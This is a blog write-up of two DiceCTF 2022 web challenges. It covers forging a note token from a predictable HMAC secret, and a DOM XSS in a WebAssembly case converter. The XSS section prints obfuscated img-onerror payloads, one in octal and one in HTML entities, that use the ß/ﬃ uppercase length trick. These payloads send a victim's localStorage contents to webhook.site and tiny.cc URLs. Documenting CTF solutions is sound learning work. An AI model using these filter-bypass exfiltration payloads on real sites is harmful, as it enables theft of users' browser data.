---
title: "CTF - DiceCTF 2022"
categories: [ctf]
date: 2021-09-25
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - DiceCTF 2022
---

# DiceCTF 2022

<p align="center">
  <img src="/images/writeups/DiceCTF2022/logo.png" width="40%"/>
</p>

Welcome! I've participated on my own in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some web challenges! 

---

Challenge index:


### Web

- [knock-knock](#web/knock-knock)
- [blazingfast](#web/blazingfast)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

---

# Web

## web/knock-knock

BrownieInMotion
178 solves / 115 points
Knock knock? Who's there? Another pastebin!!

We can download a Dockerfile and an index.js

By introducing a message, we get a link to it:

[test](https://knock-knock.mc.ax/note?id=37975&token=81d502268f7dbb28c15b683088995c74d4b1e4b05ee1a44189c1d143a80c111d)
[test](https://knock-knock.mc.ax/note?id=38024&token=8da2562a4d90547d6f6b9fdb79031b5bb2f9c7d4a4956b32b8972b46c43d144e)
[tes2](https://knock-knock.mc.ax/note?id=37984&token=ffd80b280a47d2b16ec0f73492ae7195086ad615b531e9c8e3cdaecf9819a5e4)

<img src="/images/writeups/DiceCTF2022/Web/1_00.png" width="70%"/>

I have built the website locally, since I want to inspect the secret used to create the hash:

```
node index.js
```

I modified the script a little bit to emulate the website with the html:

```js
const crypto = require('crypto');
const path = require('path');

class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }

  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    
    const ret = {
      id,
      token: this.generateToken(id),
    };
    console.log(`ret: ${ret.token}`);
    return ret
  }

  getNote({ id, token }) {
    if (token !== this.generateToken(id)) return { error: 'invalid token' };
    if (id >= this.notes.length) return { error: 'note not found' };
    return { data: this.notes[id] };
  }

  generateToken(id) {
    console.log(this.secret);
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
}

const db = new Database();
db.createNote({ data: 'FLAG' });

const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.static('public'));

app.post('/create', (req, res) => {
  const data = req.body.data ?? 'no data provided.';
  const { id, token } = db.createNote({ data: data.toString() });
  res.redirect(`/note?id=${id}&token=${token}`);
});

app.get('/note', (req, res) => {
  const { id, token } = req.query;
  const note = db.getNote({
    id: parseInt(id ?? '-1'),
    token: (token ?? '').toString(),
  });
  if (note.error) {
    res.send(note.error);
  } else {
    res.send(note.data);
  }
});

app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, '/index.html'));
});

app.listen(3000, () => {
  console.log('listening on port 3000');
});
```

index.html
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
</head>
<body>
    <style>
        * {
          font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
            'Helvetica Neue', sans-serif;
          box-sizing: border-box;
        }

        html,
        body {
          margin: 0;
        }

        .container {
          padding: 2rem;
          width: 90%;
          max-width: 900px;
          margin: auto;
        }

        input:not([type='submit']) {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
        }

        textarea {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
          resize: vertical;
          font-family: monospace;
        }

        input[type='submit'] {
          margin-bottom: 16px;
        }
    </style>

    <div class="container">
        <h1>Create Paste</h1>
        <form method="POST" action="/create">
            <textarea name="data"></textarea>
            <input type="submit" value="Create" />
        </form>
    </div>
</body>
</html>
```

In the output we can see that the actual secret-${crypto.randomUUID} is the actual function implementation of the [crypto.randomUUID](https://nodejs.org/api/crypto.html#cryptorandomuuidoptions) but it's not calling it, therefore, the randomUUID is nothing but static code in node version 17.4.0. Be sure to run that version, code in other versions might be different:

Running the code:
```
kali@kali:~/Desktop/CTFs/DiceCTF2022/Web/knock$ node index.js

secret-function randomUUID(options) {
  if (options !== undefined)
    validateObject(options, 'options');
  const {
    disableEntropyCache = false,
  } = options || {};

  validateBoolean(disableEntropyCache, 'options.disableEntropyCache');

  return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID();
}
ret: 7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
listening on port 3000
```

Knowing that the flag is introduced at launch, index is 0 and the token is 7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264

[https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264](https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264)

<img src="/images/writeups/DiceCTF2022/Web/1_0_flag.png" width="70%"/>

``` dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r} ```


## web/blazingfast

larry
24 solves / 225 points
I made a blazing fast MoCkInG CaSe converter!

[blazingfast.mc.ax](https://blazingfast.mc.ax/)

[Admin Bot](https://admin-bot.mc.ax/blazingfast)

So our mission is to exfiltrate the localStorage variable from the admin when he visits out URL
This is the admin code:

```js
import flag from './flag.txt'

function sleep(time) {
  return new Promise(resolve => {
    setTimeout(resolve, time)
  })
}

export default {
  id: 'blazingfast',
  name: 'blazingfast',
  urlRegex: /^https:\/\/blazingfast\.mc\.ax\//,
  timeout: 10000,
  handler: async (url, ctx) => {
    const page = await ctx.newPage()
    await page.goto('https://blazingfast.mc.ax/', { timeout: 3000, waitUntil: 'domcontentloaded' })
    await page.evaluate(flag => localStorage.setItem('flag', flag), flag)
    await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' })
    await sleep(3000)
  }
}
```

The webasm code

```c
#include <stdio.h>
#include <string.h>

int length, ptr = 0;
char buf[1000];

void init(int size) {
    length = size;
    ptr = 0;
}

char read() {
    return buf[ptr++];
}

void write(char c) {
    buf[ptr++] = c;
}

int mock() {
    for (int i = 0; i < length; i ++) {
        if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
            buf[i] += 32;
        }
        if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
            return 1;
        }
    }
    ptr = 0;
    return 0;
}

int main(int argc, char *argv[]) {
    char input[1000];
    write(66);
    printf("Enter payload:");
    scanf("%s", input);
    printf("%s",input);
    init(strlen(input));
    for (int i = 0; i < strlen(input); ++i)
    {
        write(input[i]);
    }
}
```

And the main page

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>blazingfast</title>
    <style>
        * {
            font-family: monospace;
        }

        body {
            max-width: 700px;
            width: 100%;
            margin: auto;
        }

        code, pre {
            background-color: whitesmoke;
            padding: 2px;
        }
    </style>
</head>
<body>
<h1>blazingfast</h1>
<hr>
<code>blazingfast</code> is a blazing fast MoCkInG CaSe converter written in WASM!
<br><br>

Try it here:<br><br>
<textarea id="demo" rows="15" cols="50"></textarea><br><br>
<button id="demo-submit">Mock me!</button>
<hr>
<pre><code id="result">The MoCkInG CaSe text will be here!</code></pre>
</body>

<script>
let blazingfast = null;

function mock(str) {
    
    blazingfast.init(str.length);
    if (str.length >= 1000) return 'Too long!';

    for (let c of str.toUpperCase()) {
        if (c.charCodeAt(0) > 128) return 'Nice try.';
        blazingfast.write(c.charCodeAt(0));
    }

    if (blazingfast.mock() == 1) {
        return 'No XSS for you!';
    } else {
        let mocking = '', buf = blazingfast.read();

        while(buf != 0) {
            mocking += String.fromCharCode(buf);
            buf = blazingfast.read();
        }

        return mocking;
    }
}

function demo(str) {
    document.getElementById('result').innerHTML = mock(str);
}

WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) => {   
    blazingfast = instance.exports;

    document.getElementById('demo-submit').onclick = () => {
        demo(document.getElementById('demo').value);
    }

    let query = new URLSearchParams(window.location.search).get('demo');

    if (query) {
        document.getElementById('demo').value = query;
        demo(query);
    }
})
</script>
</html>
```

We can spot an [DOM XSS vulnerability](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink) on the innerHTML in the JS. It's value will be set to the result of the mock function with our input as a parameter:

```js
function demo(str) {
    document.getElementById('result').innerHTML = mock(str);
}
```

Then the mock funtion works as follow:

```js
function mock(str) {

    // Call the init function, which sets the length of our input string 
    blazingfast.init(str.length);

    if (str.length >= 1000) return 'Too long!';

    // All chars are set to upper case
    for (let c of str.toUpperCase()) {
        
        // If it's code is over 128, then it stops the writting into the web asembly buffer
        if (c.charCodeAt(0) > 128) return 'Nice try.';
        // Integers are written into the web asm buffer
        blazingfast.write(c.charCodeAt(0));
    }

    // Mock function returns 1 when chars '<' '>' '&' or '"' are in the buffer, therefore it's rejected
    if (blazingfast.mock() == 1) {
        return 'No XSS for you!';
    } else {
        let mocking = '', buf = blazingfast.read();

        // Reads the buffer and returns
        while(buf != 0) {
            mocking += String.fromCharCode(buf);
            buf = blazingfast.read();
        }

        return mocking;
    }
}
```

Now let's analyze the Web asembly code:

```c
void init(int size) {
    // Interesting, size it's set from the JS code
    length = size;
    ptr = 0;
}

int mock() {
    for (int i = 0; i < length; i ++) {
        // Even chars are set to lower case (+32 in decimal ascii)
        if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
            buf[i] += 32;
        }
        // Forbidden chars are detected and returns at first encounter
        if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
            return 1;
        }
    }
    ptr = 0;
    return 0;
}
```

Now moving into explotation, we know that normal XSS payloads with <script> </script> won't work in HTML5, therefore we need to use an _<img src=x onerror="l">_ kind of payload.

At first we had three paths to explore:

- Bypass forbidden characters detection
- Algorithm logic
- TOCTOU over string length


_Bypass forbidden characters detection_

Concept: How about using Unicode bypasses?

We can craft a payload with chars U+FF1C and U+FF1E

```html
＜script/src=//evil.site/poc.js＞
```

Trick didn't worked out, due to this check on the JS. Our unicode characters were way above it:

```js
if (c.charCodeAt(0) > 128) return 'Nice try.';
```

_Algorithm logic_

**Spoiler: base concept was wrong, since we couldn't achieve a two URL call in the admin ^^'**

Concept: Our input is written in the buffer if we use use normal ASCII caracters. Then, we can set our payload with an offset in a first call to the URL, then make a call with a payload with length equals than the first offset.

First we call the website with the following URL:

https://blazingfast.mc.ax/?demo=.....<img src='x' onerror='alert(1)'>

https://blazingfast.mc.ax/?demo=.....%3Cimg%20src=%27x%27%20onerror=%27alert(1)%27%3E

Then, we remove the part with the payload and left the valid offset. Call the function again and we can see that the payload is being written into the HTML. alert is not popping due to the uppercase done previously in the JS, the rest of the payload is working fine, since browser is correctly interpreting the HTML keywords:

<img src="/images/writeups/DiceCTF2022/Web/2_01.png" width="70%"/>

Now moving into crafting a payload. We have to steal the flag value from localstorage with a payload like this:

```
https://blazingfast.mc.ax/?demo=.....<img src=x onerror="location.href='https://webhook.site/9ed73e58-c688-47c5-9ec8-826693de1421?c='+localStorage.getItem('flag')">
```

After having some tries on figuring out how to overcome the uppercase characters, RazviOverflow came across a great idea for the URL, using a URL shortener:

```
https://blazingfast.mc.ax/?demo=.....<img src=x onerror="location.href='http://tiny.cc/70pouz?c='+localStorage.getItem('flag')">
```

Still didn't work, since location.href or other methos like this.src didn't work out in uppercase, therefore we still need a bypass for that.

Looking for a solution we tried using some octal bypasses:

```
https://blazingfast.mc.ax/?demo=.....<img src=x onerror=[][filter][constructor](location.href='http://tiny.cc/70pouz?c='+localStorage.getItem('flag'))()>
```
To octal:

```
https://blazingfast.mc.ax/?demo=.....<img src=x onerror=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\154\157\143\141\164\151\157\156\56\150\162\145\146\75\47\150\164\164\160\72\57\57\164\151\156\171\56\143\143\57\67\60\160\157\165\172\77\143\75\47\53\154\157\143\141\154\123\164\157\162\141\147\145\56\147\145\164\111\164\145\155\50\47\146\154\141\147\47\51")()>
```
Then we bypassed the uppercase filter and got our local exploit using the URL parameter and changing the payload length:

<img src="/images/writeups/DiceCTF2022/Web/2_02.png" width="70%"/>

Now things got complicated in this path since we found no method to replicate this on the admin bot :(


_TOCTOU on string length_

We tried many things with special characters and unicode, looking at the documentation for toUpperCase, but missed the great ß character.
Check out the great [writeup on this task](https://brycec.me/posts/dicectf_2022_writeups#blazingfast)

Main idea is that ß character has length of 1, but when converted to uppercase in JS, it converts to "SS", 2 char length:

<img src="/images/writeups/DiceCTF2022/Web/2_03.png" width="50%"/>

Then we have to add at least, the same number of ß as our payload:

```
https://blazingfast.mc.ax/?demo=ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß<img src=x onerror=[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\154\157\143\141\164\151\157\156\56\150\162\145\146\75\47\150\164\164\160\72\57\57\164\151\156\171\56\143\143\57\67\60\160\157\165\172\77\143\75\47\53\154\157\143\141\154\123\164\157\162\141\147\145\56\147\145\164\111\164\145\155\50\47\146\154\141\147\47\51")()>
```

As seen in other writeups, we can also use XML encoding for the characters instead of octal:

```
https://blazingfast.mc.ax/?demo=ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<img src=x onerror=&#X6c;&#X6f;&#X63;&#X61;&#X74;&#X69;&#X6f;&#X6e;.&#X68;&#X72;&#X65;&#X66;=&#X27;https://webhook.site/9ed73e58-c688-47c5-9ec8-826693de1421?q=&#X27.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;()&#X2B;&#X6c;&#X6f;&#X63;&#X61;&#X6c;&#X53;&#X74;&#X6f;&#X72;&#X61;&#X67;&#X65;.&#X67;&#X65;&#X74;&#X49;&#X74;&#X65;&#X6d;(&#X27;flag&#X27;.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;())>
```

Once the input is passed to the admin, the flag will show up in the weebhok site:

<img src="/images/writeups/DiceCTF2022/Web/2_04.png" width="50%"/>

<img src="/images/writeups/DiceCTF2022/Web/2_4_flag.png" width="70%"/>


``` dice{1_dont_know_how_to_write_wasm_pwn_s0rry} ```

That's all, thanks for reading!